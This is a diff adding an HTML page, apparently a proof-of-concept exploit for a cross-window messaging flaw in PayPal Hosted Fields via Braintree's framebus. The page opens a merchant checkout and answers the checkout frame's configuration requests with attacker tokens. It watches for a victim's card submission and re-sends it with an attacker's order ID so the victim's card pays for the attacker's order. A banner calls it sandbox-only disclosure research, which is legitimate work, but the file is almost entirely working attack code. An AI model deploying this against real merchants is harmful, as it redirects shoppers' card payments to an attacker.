@@ -1,0 +1,114 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>opener</title>
+<style>
+  body { font: 15px/1.5 system-ui, sans-serif; max-width: 920px; margin: 30px auto; padding: 0 16px; }
+  input { width: 100%; box-sizing: border-box; padding: 6px; font-family: monospace; }
+  label { display:block; margin: 12px 0 4px; font-size: 13px; color:#444; }
+  button { margin: 14px 8px 0 0; padding: 9px 14px; cursor: pointer; }
+  pre { background:#0b0b0b; color:#b9f6b9; padding:14px; white-space:pre-wrap; word-break:break-all;
+        font:12px/1.5 ui-monospace,monospace; max-height:55vh; overflow:auto; }
+  .warn { background:#fff3f3; border:1px solid #e0a0a0; padding:10px; border-radius:6px; font-size:13px; }
+</style>
+
+<h1>Hostile opener</h1>
+<div class="warn">
+Security research proof of concept for a reported issue in PayPal Hosted Fields. It only talks to a
+researcher owned sandbox merchant and a researcher owned sandbox order. It performs no action against
+any third party.
+</div>
+
+<label>Merchant checkout URL (researcher owned)</label>
+<input id="merchant" value="https://shop.zonduu.me/">
+<label>Attacker sandbox client ID</label><input id="cid" autocomplete="off">
+<label>Attacker sandbox access token</label><input id="tok" autocomplete="off">
+<label>Attacker sandbox order ID (the order the victim card should fund)</label>
+<input id="oid" autocomplete="off">
+
+<button id="open">1. Open merchant checkout</button>
+<button id="noopener">open with noopener (negative control)</button>
+
+<pre id="log">ready.
+</pre>
+
+<script>
+const PREFIX = '/*framebus*/';
+const logEl = document.getElementById('log');
+const log = (m) => { logEl.textContent += m + '\n'; logEl.scrollTop = logEl.scrollHeight; };
+const $ = (id) => document.getElementById(id).value.trim();
+
+let channel = null, tokFrame = null;
+const readyByChannel = new Map();
+
+function attackerConfig() {
+  return {
+    authorization: $('tok') || 'ATTACKER_TOKEN',
+    authorizationType: 'UNIFIED_CLIENT_TOKEN',
+    analyticsMetadata: {},
+    correlationId: 'attacker-correlation-id',
+    deviceDataId: 'attacker-device-id',
+    gatewayConfiguration: {
+      assetsUrl: 'https://assets.braintreegateway.com',
+      clientApiUrl: 'https://api.sandbox.braintreegateway.com',
+      analytics: { url: 'https://example.invalid/analytics' },
+      creditCards: { supportedCardTypes: ['Visa','MasterCard'], supportedGateways: [{ name: 'paypalApi' }] },
+      paypalApi: { baseUrl: 'https://api-m.sandbox.paypal.com', accessToken: $('tok') || 'ATTACKER_TOKEN' }
+    }
+  };
+}
+
+function reply(source, event, value) {
+  // origin '' / '*' on purpose: the point of the report is that the frame does not check it
+  source.postMessage(PREFIX + JSON.stringify({ event, origin: '', args: [value] }), '*');
+}
+
+window.addEventListener('message', (e) => {
+  if (typeof e.data !== 'string' || !e.data.startsWith(PREFIX)) return;
+  let p; try { p = JSON.parse(e.data.slice(PREFIX.length)); } catch (_) { return; }
+  const ev = String(p.event || '');
+
+  if (ev.endsWith(':bus:CONFIGURATION_REQUEST') && p.reply) {
+    channel = ev.slice('braintree:'.length, -':bus:CONFIGURATION_REQUEST'.length);
+    tokFrame = e.source;
+    log('<< ' + e.origin + '  CONFIGURATION_REQUEST  channel=' + channel);
+    reply(e.source, p.reply, attackerConfig());
+    log('>> replied with ATTACKER configuration (token + api base)');
+  }
+
+  if (ev.endsWith(':hosted-fields:FRAME_READY') && p.reply) {
+    const suffix = ':hosted-fields:FRAME_READY';
+    const ch = ev.slice('braintree:'.length, -suffix.length);
+    const arr = readyByChannel.get(ch) || [];
+    arr.push({ source: e.source, reply: p.reply });
+    readyByChannel.set(ch, arr);
+    log('<< ' + e.origin + '  FRAME_READY  (' + arr.length + ')');
+  }
+
+  if (ev.endsWith(':hosted-fields:TOKENIZATION_REQUEST') && p.args && p.args[0]) {
+    log('<< observed the victim submit: ' + JSON.stringify(p.args[0]));
+    // the victim is submitting their card; swap in the attacker order id
+    const swapped = Object.assign({}, p.args[0], { orderId: $('oid') || 'ATTACKER-ORDER' });
+    e.source.postMessage(PREFIX + JSON.stringify({
+      event: 'braintree:' + channel + ':hosted-fields:TOKENIZATION_REQUEST',
+      origin: '', reply: 'attacker-tokenization-reply', args: [swapped]
+    }), '*');
+    log('>> re-issued TOKENIZATION_REQUEST with orderId=' + swapped.orderId);
+  }
+
+  if (ev === 'attacker-tokenization-reply') {
+    log('<< FRAME REPLIED TO ATTACKER ORIGIN: ' + JSON.stringify(p.args));
+  }
+});
+
+document.getElementById('open').addEventListener('click', () => {
+  const u = new URL($('merchant'));
+  if ($('cid')) u.searchParams.set('client-id', $('cid'));
+  window.open(u.toString(), 'checkout-' + Date.now());
+  log('opened ' + u.toString() + '   (this page is now window.opener)');
+});
+
+document.getElementById('noopener').addEventListener('click', () => {
+  window.open($('merchant'), 'nc-' + Date.now(), 'noopener');
+  log('opened with noopener: window.opener is null, no framebus traffic should arrive');
+});
+</script>
